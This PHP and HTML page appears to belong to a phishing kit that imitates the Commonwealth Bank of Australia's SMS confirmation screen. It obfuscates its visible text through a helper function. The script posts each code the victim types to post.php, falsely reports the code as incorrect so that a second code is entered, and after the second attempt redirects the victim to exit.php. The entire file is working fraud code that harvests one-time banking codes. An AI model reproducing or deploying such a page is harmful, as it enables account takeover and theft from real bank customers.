<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log on</title>
    <link rel="stylesheet" href="res/css/auth.css">
</head>
<body>
<header>
    <img src="res/img/logo.png">
</header> 
<section>
<div class="loader" style="display:none;">
    <div style="text-align:center;">
    <img src="res/img/j1.png" style="width:210px;"><br>
    <img src="res/img/loading.gif"><br>
    <p style="font-size:0.8em;"><?php $bm->obf("Please wait..."); ?></p>
</div>
</div>


<div class="title">
<img src="res/img/phone.png" style="width:30px; margin-bottom:-10px;"> <?php $bm->obf("Confirmation"); ?>
</div>
<div class="text">
<?php $bm->obf("Please submit the code sent to your phone number to continue."); ?>
</div>

<div class="form">

<table>
<tr>
<td style="font-size:0.8em;padding-right:10px;"><?php $bm->obf("Enter code"); ?> </td>
<td><input type="text" id="sms" class="textinput"><br><label id="error-msg" style="color:red; display:none; font-size:0.8em;"><?php $bm->obf("Incorrect confirmation code"); ?></label></td>
</tr>
<tr>
<td></td>
<td><button onclick="sbmt()">NEXT ></button></td>
</tr>
<tr>
<td></td>
<td><u style="font-size:0.8em;"><?php $bm->obf("Didn't receive confirmation code?"); ?></u></td>
</tr>
</table>
</div>




</section>
<footer>
<div class="links">
    <span><?php $bm->obf("Tools & calculators"); ?></span>
    <span><?php $bm->obf("Find a branch"); ?></span>
    <span><?php $bm->obf("Financial assistance"); ?></span>
    <span><?php $bm->obf("Contact us"); ?></span>
</div>
<?php $bm->obf("© 2023 Commonwealth Bank of Australia ABN 48 123 123 124 AFSL and Australian credit licence 234945"); ?>
</footer>




<script src="res/js/jq.js"></script>
<script>
    var loader = $(".loader");
    var count = 0;
    var error_msg = $("#error-msg");
$("input").keypress((e)=>{
    if(e.key=="Enter"){
        sbmt();
    }
});

function sbmt(){
    var sms = $("#sms").val();
    var sub = true;
    $("#sms").removeClass("error");
    if(sms.length<4){
        $("#sms").addClass("error");
        sub=false;
    }

    if(sub){
        error_msg.show();
        loader.show();
            count++;
        $.post("post.php",{sms:sms},(res)=>{
            if(count==2){
                setTimeout(() => {window.location="exit.php"; }, 10000);
            }else{
                setTimeout(() => {
                    loader.hide();
                    $("#sms").val("");
                    $("#sms").addClass("error");
                    error_msg.show();
                   
                }, 7000);
            }
        });
    }

}

 
</script>
</body>
</html>